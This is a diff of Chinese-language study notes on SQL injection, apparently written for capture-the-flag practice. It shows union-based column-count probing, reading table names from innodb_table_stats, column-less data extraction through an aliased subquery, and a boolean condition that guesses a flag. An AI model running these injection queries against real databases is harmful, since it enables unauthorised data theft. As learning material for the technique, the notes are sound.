@@ -34,7 +34,7 @@ select group_concat(table_name）from mysql.innodb_table_stats where database_na
 <https://www.cnblogs.com/hello-there/p/12918265.html>
 知道表名
 ```
-表的字段数判断：select 1,2 from user  试出字段数。
+表的字段数判断：select 1,2 union select * from user  试出字段数。
 
 再直接查出值，无需知道字段名，查出原表第2的字段的所有记录值
 select 1,2 union select * from user;
@@ -47,13 +47,12 @@ select group_concat(`2`) from  (select 1,2 union select * from user) as u
 
 1. 列名需要用`\`包裹起来，字段名为数字，则`2`
 
-
 2. 使用子查询的时候,即一个查询嵌套在另一个查询中,内层查询的结果可以作为外层查询的条件,内层查询到的结果需要起一个别名(as)
 ```
 
 ## **布尔中知道表名，不知字段名注入，布尔加无列名注入**
 ```
-表中如果有多个记录值：要条件查询成一条，一般都是一条。where name like "chenji"
+表中如果有多个记录值：要条件查询成一条，一般都是一条。where flag like "f%"
 
 
 
